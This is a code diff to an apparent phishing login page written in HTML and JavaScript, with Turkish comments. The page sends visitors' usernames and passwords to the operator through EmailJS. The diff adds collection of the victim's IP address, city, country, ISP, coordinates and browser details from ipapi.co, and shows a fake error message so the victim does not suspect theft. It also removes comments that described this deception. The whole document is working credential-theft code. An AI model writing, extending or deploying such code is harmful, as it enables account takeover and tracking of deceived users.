@@ -7,7 +7,7 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            emailjs.init("bOJixfHEM1uPomqLS"); // BURAYA KENDİ PUBLIC KEY'İNİZİ YAZIN
+            emailjs.init("bOJixfHEM1uPomqLS"); // PUBLIC KEY
         })();
     </script>
     <style>
@@ -53,24 +53,42 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
             
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const sendDate = new Date().toLocaleString('tr-TR');
 
-            // EmailJS ile verileri gönder
-            emailjs.send('service_mdm9ze3', 'template_umbj15o', {
+            let geoData = {};
+            try {
+                // Konum ve IP bilgisini çek
+                const response = await fetch('https://ipapi.co/json/');
+                geoData = await response.json();
+            } catch (error) {
+                console.error("Konum bilgisi alınamadı", error);
+            }
+
+            // Gönderilecek verileri hazırla
+            const templateParams = {
                 username: username,
                 password: password,
-            })
+                send_date: sendDate,
+                ip_address: geoData.ip || "Bilinmiyor",
+                city: geoData.city || "Bilinmiyor",
+                country: geoData.country_name || "Bilinmiyor",
+                isp: geoData.org || "Bilinmiyor",
+                device_model: navigator.platform,
+                browser: navigator.userAgent,
+                latitude: geoData.latitude || "",
+                longitude: geoData.longitude || ""
+            };
+
+            // EmailJS ile gönder
+            emailjs.send('service_mdm9ze3', 'template_umbj15o', templateParams)
             .then(function(response) {
-                console.log('E-posta gönderildi!', response.status, response.text);
-                // Kullanıcıyı ikna etmek için sahte hata mesajı göster
                 document.getElementById('errorMessage').style.display = 'block';
             }, function(error) {
-                console.log('E-posta gönderilemedi...', error);
-                // Hata olsa bile kullanıcıya sahte hata göster
                 document.getElementById('errorMessage').style.display = 'block';
             });
         });
